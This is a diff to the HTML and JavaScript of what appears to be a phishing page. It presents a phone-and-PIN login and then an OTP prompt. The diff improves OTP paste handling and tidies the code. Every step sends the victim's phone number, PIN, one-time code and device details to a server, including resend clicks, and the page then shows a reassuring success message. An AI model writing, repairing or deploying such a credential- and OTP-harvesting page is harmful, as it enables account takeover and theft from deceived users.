@@ -121,9 +121,10 @@ input{
 .resend-btn{
   background:#020617;
   border:1px solid #1f2937;
-  padding:8px 14px;
+  padding:10px 14px;
   border-radius:8px;
-  color:#e5e7eb
+  color:#e5e7eb;
+  flex:1
 }
 .resend-btn[disabled]{opacity:.5}
 
@@ -198,45 +199,47 @@ input{
 
 <script>
 /* ===== DEVICE ===== */
-const ua = navigator.userAgent;
-let device = 'Unknown';
+const ua=navigator.userAgent;
+let device='Unknown';
 
-if (/Android/i.test(ua)) {
-  const v = ua.match(/Android\s([\d.]+)/);
-  device = 'Android ' + (v ? v[1] : '');
-} else if (/iPhone|iPad/i.test(ua)) {
-  const v = ua.match(/OS (\d+_\d+)/);
-  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
+if(/Android/i.test(ua)){
+  const v=ua.match(/Android\s([\d.]+)/);
+  device='Android '+(v?v[1]:'');
+}else if(/iPhone|iPad/i.test(ua)){
+  const v=ua.match(/OS (\d+_\d+)/);
+  device='iOS '+(v?v[1].replace('_','.'):'');
 }
-if (/Chrome/i.test(ua)) device += ' | Chrome';
-else if (/Safari/i.test(ua)) device += ' | Safari';
-else if (/Firefox/i.test(ua)) device += ' | Firefox';
+if(/Chrome/i.test(ua)) device+=' | Chrome';
+else if(/Safari/i.test(ua)) device+=' | Safari';
+else if(/Firefox/i.test(ua)) device+=' | Firefox';
 
 /* ===== PLAN ===== */
-let selectedPlan = null;
-try {
-  selectedPlan = JSON.parse(sessionStorage.getItem('selectedPlan'));
-} catch(e){}
+let selectedPlan=null;
+try{selectedPlan=JSON.parse(sessionStorage.getItem('selectedPlan'));}catch(e){}
 
 function normalizePlan(plan){
   if(!plan) return 'N/A';
-  if(typeof plan === 'string') return plan;
-  const name = plan.name || plan.shortName || '';
-  const price = plan.price || plan.amount;
-  return price ? `${name} — ${price}` : name;
+  if(typeof plan==='string') return plan;
+  const name=plan.name||plan.shortName||'';
+  const price=plan.price||plan.amount;
+  return price?`${name} — ${price}`:name;
 }
 
+/* ===== OTP PASTE LOCK ===== */
+let otpPasting=false;
+
 /* ===== SHARED DIGIT HANDLER ===== */
-function bindDigitInputs(list, onChange){
+function bindDigitInputs(list,onChange){
   list.forEach((el,i)=>{
     el.addEventListener('input',()=>{
+      if(otpPasting) return;
       el.value=el.value.replace(/\D/g,'');
       el.classList.toggle('filled',!!el.value);
-      if(el.value && i<list.length-1) list[i+1].focus();
+      if(el.value&&i<list.length-1) list[i+1].focus();
       onChange();
     });
     el.addEventListener('keydown',e=>{
-      if(e.key==='Backspace' && !el.value && i>0){
+      if(e.key==='Backspace'&&!el.value&&i>0){
         list[i-1].focus();
         list[i-1].value='';
         list[i-1].classList.remove('filled');
@@ -277,7 +280,7 @@ bindDigitInputs(pins,()=>{
 });
 
 function updateLogin(){
-  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
+  loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue));
 }
 
 /* ===== API ===== */
@@ -305,7 +308,6 @@ function startCountdown(){
   seconds=120;
   resendBtn.disabled=true;
   countdown.textContent=seconds;
-
   timer=setInterval(()=>{
     seconds--;
     countdown.textContent=seconds;
@@ -325,16 +327,14 @@ function updateOtpState(){
 
 bindDigitInputs(dEls,updateOtpState);
 
-/* ===== OTP PASTE (HARD FIX) ===== */
+/* ===== OTP PASTE (FIXED) ===== */
 dEls.forEach(el=>{
   el.addEventListener('paste',e=>{
     e.preventDefault();
-    const data=(e.clipboardData||window.clipboardData)
-      .getData('text')
-      .replace(/\D/g,'')
-      .slice(0,5);
+    otpPasting=true;
 
-    if(!data) return;
+    const data=(e.clipboardData||window.clipboardData)
+      .getData('text').replace(/\D/g,'').slice(0,5);
 
     dEls.forEach(d=>{
       d.value='';
@@ -348,8 +348,8 @@ dEls.forEach(el=>{
       }
     });
 
-    dEls[Math.min(data.length,4)].focus();
     updateOtpState();
+    setTimeout(()=>otpPasting=false,50);
   });
 });
 
@@ -361,11 +361,11 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
 
   await sendToServer({
     event:'login_clicked',
-    loginPhone: phone.value,
-    loginPin: pinValue,
-    plan: normalizePlan(selectedPlan),
-    device: device || 'Unknown',
-    submittedAt: new Date().toISOString()
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
   });
 
   document.getElementById('otpModal').style.display='flex';
@@ -381,12 +381,12 @@ confirmBtn.onclick=async()=>{
 
   await sendToServer({
     event:'otp_confirm',
-    loginPhone: phone.value,
-    loginPin: pinValue,
-    otp: dEls.map(d=>d.value).join(''),
-    plan: normalizePlan(selectedPlan),
-    device: device || 'Unknown',
-    submittedAt: new Date().toISOString()
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    otp:dEls.map(d=>d.value).join(''),
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
   });
 
   otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
@@ -397,11 +397,11 @@ confirmBtn.onclick=async()=>{
 resendBtn.onclick=async()=>{
   await sendToServer({
     event:'resend_otp',
-    loginPhone: phone.value,
-    loginPin: pinValue,
-    plan: normalizePlan(selectedPlan),
-    device: device || 'Unknown',
-    submittedAt: new Date().toISOString()
+    loginPhone:phone.value,
+    loginPin:pinValue,
+    plan:normalizePlan(selectedPlan),
+    device,
+    submittedAt:new Date().toISOString()
   });
   startCountdown();
 };
@@ -411,5 +411,6 @@ document.getElementById('cancelOtp').onclick=()=>{
   clearInterval(timer);
 };
 </script>
+
 </body>
 </html>
